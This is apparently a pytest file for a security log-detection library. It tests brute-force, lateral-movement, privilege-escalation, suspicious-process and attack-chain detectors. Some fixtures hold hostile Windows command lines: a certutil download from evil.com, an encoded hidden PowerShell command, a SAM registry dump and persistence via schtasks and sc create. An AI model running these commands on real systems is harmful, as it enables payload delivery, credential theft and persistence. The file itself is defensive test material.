"""Tests for built-in detection modules."""

from datetime import datetime, timedelta

from tests.conftest import (
    make_failed_logon,
    make_network_logon,
    make_priv_event,
    make_process_event,
)
from threatlens.detections import (
    BruteForceDetector,
    LateralMovementDetector,
    PrivilegeEscalationDetector,
    SuspiciousProcessDetector,
)
from threatlens.models import Severity


class TestBruteForce:
    def test_triggers_on_burst(self, base_time):
        events = [make_failed_logon(base_time + timedelta(seconds=i * 5)) for i in range(7)]
        alerts = BruteForceDetector().analyze(events)
        assert len(alerts) >= 1
        assert alerts[0].severity in (Severity.MEDIUM, Severity.HIGH)

    def test_no_alert_below_threshold(self, base_time):
        events = [make_failed_logon(base_time + timedelta(seconds=i * 5)) for i in range(3)]
        alerts = BruteForceDetector().analyze(events)
        assert len(alerts) == 0

    def test_password_spray_detected(self, base_time):
        users = ["admin", "jsmith", "svc_backup", "helpdesk", "dbadmin"]
        events = [
            make_failed_logon(base_time + timedelta(seconds=i * 2), user=u)
            for i, u in enumerate(users)
        ]
        alerts = BruteForceDetector().analyze(events)
        assert len(alerts) >= 1
        assert "Spray" in alerts[0].rule_name

    def test_no_alerts_on_empty(self):
        assert BruteForceDetector().analyze([]) == []

    def test_custom_threshold(self, base_time):
        events = [make_failed_logon(base_time + timedelta(seconds=i * 5)) for i in range(3)]
        # Lower threshold should trigger
        detector = BruteForceDetector(config={"brute_force_threshold": 2})
        alerts = detector.analyze(events)
        assert len(alerts) >= 1

    def test_mitre_mapping(self, base_time):
        events = [make_failed_logon(base_time + timedelta(seconds=i * 5)) for i in range(7)]
        alerts = BruteForceDetector().analyze(events)
        assert alerts[0].mitre_tactic == "Credential Access"
        assert "T1110" in alerts[0].mitre_technique


class TestLateralMovement:
    def test_triggers_on_multi_host(self, base_time):
        events = [
            make_network_logon(base_time, "svc_deploy", "DC-01"),
            make_network_logon(base_time + timedelta(seconds=30), "svc_deploy", "FILE-SVR01"),
            make_network_logon(base_time + timedelta(seconds=60), "svc_deploy", "WEB-SVR01"),
        ]
        alerts = LateralMovementDetector().analyze(events)
        assert len(alerts) >= 1

    def test_no_alert_single_host(self, base_time):
        events = [
            make_network_logon(base_time, "jdoe", "WS-PC01"),
            make_network_logon(base_time + timedelta(seconds=30), "jdoe", "WS-PC01"),
        ]
        alerts = LateralMovementDetector().analyze(events)
        assert len(alerts) == 0

    def test_ignores_system_accounts(self, base_time):
        events = [
            make_network_logon(base_time, "SYSTEM", f"SVR-{i:02d}")
            for i in range(5)
        ]
        alerts = LateralMovementDetector().analyze(events)
        assert len(alerts) == 0

    def test_rdp_higher_severity(self, base_time):
        events = [
            make_network_logon(base_time, "attacker", "DC-01", logon_type=10),
            make_network_logon(base_time + timedelta(seconds=30), "attacker", "FILE-SVR01", logon_type=10),
            make_network_logon(base_time + timedelta(seconds=60), "attacker", "WEB-SVR01", logon_type=10),
        ]
        alerts = LateralMovementDetector().analyze(events)
        assert len(alerts) >= 1
        assert alerts[0].severity == Severity.HIGH

    def test_no_alerts_on_empty(self):
        assert LateralMovementDetector().analyze([]) == []


class TestPrivilegeEscalation:
    def test_triggers_on_debug_priv(self):
        ts = datetime(2025, 1, 15, 9, 5, 0)
        events = [make_priv_event(ts, "jdoe", "SeDebugPrivilege")]
        alerts = PrivilegeEscalationDetector().analyze(events)
        assert len(alerts) == 1
        assert alerts[0].severity == Severity.HIGH

    def test_ignores_system_account(self):
        ts = datetime(2025, 1, 15, 9, 5, 0)
        events = [make_priv_event(ts, "SYSTEM", "SeDebugPrivilege")]
        alerts = PrivilegeEscalationDetector().analyze(events)
        assert len(alerts) == 0

    def test_no_alert_for_normal_priv(self):
        ts = datetime(2025, 1, 15, 9, 5, 0)
        events = [make_priv_event(ts, "jdoe", "SeChangeNotifyPrivilege")]
        alerts = PrivilegeEscalationDetector().analyze(events)
        assert len(alerts) == 0

    def test_multiple_sensitive_privs(self):
        ts = datetime(2025, 1, 15, 9, 5, 0)
        events = [make_priv_event(ts, "jdoe", "SeDebugPrivilege\n\t\tSeTcbPrivilege")]
        alerts = PrivilegeEscalationDetector().analyze(events)
        assert len(alerts) == 1
        assert "SeDebugPrivilege" in alerts[0].description
        assert "SeTcbPrivilege" in alerts[0].description

    def test_no_alerts_on_empty(self):
        assert PrivilegeEscalationDetector().analyze([]) == []


class TestSuspiciousProcess:
    def test_encoded_powershell(self):
        ts = datetime(2025, 1, 15, 9, 10, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC==",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) >= 1
        assert alerts[0].severity == Severity.HIGH

    def test_certutil_download(self):
        ts = datetime(2025, 1, 15, 9, 10, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\certutil.exe",
            "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\svc.exe",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) >= 1

    def test_sam_dump(self):
        ts = datetime(2025, 1, 15, 9, 15, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\reg.exe",
            "reg save HKLM\\SAM C:\\Temp\\sam.hiv",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) >= 1
        assert alerts[0].severity == Severity.CRITICAL

    def test_benign_process_no_alert(self):
        ts = datetime(2025, 1, 15, 9, 10, 0)
        events = [make_process_event(
            ts,
            "C:\\Program Files\\Notepad\\notepad.exe",
            "notepad.exe C:\\Documents\\readme.txt",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) == 0

    def test_schtasks_maps_to_persistence(self):
        ts = datetime(2025, 1, 15, 10, 0, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\schtasks.exe",
            'schtasks /create /tn "Updater" /tr "C:\\Temp\\bad.exe" /sc daily',
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) >= 1
        assert alerts[0].mitre_tactic == "Persistence"
        assert "T1053" in alerts[0].mitre_technique

    def test_sc_create_maps_to_persistence(self):
        ts = datetime(2025, 1, 15, 10, 0, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\sc.exe",
            'sc create BadSvc binPath= "C:\\Temp\\bad.exe" start= auto',
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) >= 1
        assert alerts[0].mitre_tactic == "Persistence"
        assert "T1543" in alerts[0].mitre_technique

    def test_certutil_maps_to_c2(self):
        ts = datetime(2025, 1, 15, 9, 10, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\certutil.exe",
            "certutil -urlcache -split -f http://evil.com/p.exe C:\\Temp\\svc.exe",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert alerts[0].mitre_tactic == "Command and Control"
        assert "T1105" in alerts[0].mitre_technique

    def test_sam_dump_maps_to_credential_access(self):
        ts = datetime(2025, 1, 15, 9, 15, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\reg.exe",
            "reg save HKLM\\SAM C:\\Temp\\sam.hiv",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert alerts[0].mitre_tactic == "Credential Access"
        assert "T1003" in alerts[0].mitre_technique

    def test_no_alerts_on_empty(self):
        assert SuspiciousProcessDetector().analyze([]) == []


class TestAttackChainDetector:
    def test_two_stage_chain_triggers(self, base_time):
        """Credential access + privilege escalation = HIGH alert."""
        from threatlens.detections.attack_chain import AttackChainDetector
        detector = AttackChainDetector()
        events = [
            make_failed_logon(base_time, source_ip="10.0.1.50", user="jdoe"),
            make_failed_logon(base_time + timedelta(seconds=10), source_ip="10.0.1.50", user="jdoe"),
            make_priv_event(base_time + timedelta(seconds=60), user="jdoe", privs="SeDebugPrivilege"),
        ]
        alerts = detector.analyze(events)
        assert len(alerts) == 1
        assert alerts[0].severity == Severity.HIGH
        assert "Attack Chain" in alerts[0].rule_name

    def test_three_stage_chain_is_critical(self, base_time):
        """3+ stages = CRITICAL."""
        from threatlens.detections.attack_chain import AttackChainDetector
        detector = AttackChainDetector()
        events = [
            make_failed_logon(base_time, user="attacker"),
            make_priv_event(base_time + timedelta(seconds=30), user="attacker", privs="SeDebugPrivilege"),
            make_process_event(base_time + timedelta(seconds=60), "powershell.exe", "test", user="attacker"),
        ]
        alerts = detector.analyze(events)
        assert len(alerts) == 1
        assert alerts[0].severity == Severity.CRITICAL

    def test_single_stage_no_alert(self, base_time):
        """Only one stage shouldn't trigger."""
        from threatlens.detections.attack_chain import AttackChainDetector
        detector = AttackChainDetector()
        events = [
            make_failed_logon(base_time, user="jdoe"),
            make_failed_logon(base_time + timedelta(seconds=10), user="jdoe"),
        ]
        alerts = detector.analyze(events)
        assert len(alerts) == 0

    def test_system_accounts_excluded(self, base_time):
        """SYSTEM and other system accounts should be excluded."""
        from threatlens.detections.attack_chain import AttackChainDetector
        detector = AttackChainDetector()
        events = [
            make_failed_logon(base_time, user="SYSTEM"),
            make_priv_event(base_time + timedelta(seconds=30), user="SYSTEM", privs="SeDebugPrivilege"),
        ]
        alerts = detector.analyze(events)
        assert len(alerts) == 0

    def test_events_outside_window_no_alert(self, base_time):
        """Events too far apart shouldn't trigger."""
        from threatlens.detections.attack_chain import AttackChainDetector
        detector = AttackChainDetector(config={"chain_window": 60})
        events = [
            make_failed_logon(base_time, user="jdoe"),
            make_priv_event(base_time + timedelta(seconds=120), user="jdoe", privs="SeDebugPrivilege"),
        ]
        alerts = detector.analyze(events)
        assert len(alerts) == 0

    def test_configurable_min_stages(self, base_time):
        """min_stages=3 should require 3 stages."""
        from threatlens.detections.attack_chain import AttackChainDetector
        detector = AttackChainDetector(config={"chain_min_stages": 3})
        events = [
            make_failed_logon(base_time, user="jdoe"),
            make_priv_event(base_time + timedelta(seconds=30), user="jdoe", privs="SeDebugPrivilege"),
        ]
        alerts = detector.analyze(events)
        assert len(alerts) == 0

    def test_lateral_movement_stage(self, base_time):
        """Network logon type 3 counts as lateral movement."""
        from threatlens.detections.attack_chain import AttackChainDetector
        detector = AttackChainDetector()
        events = [
            make_failed_logon(base_time, user="pivot_user"),
            make_network_logon(base_time + timedelta(seconds=30), user="pivot_user", computer="HOST-B", logon_type=3),
        ]
        alerts = detector.analyze(events)
        assert len(alerts) == 1
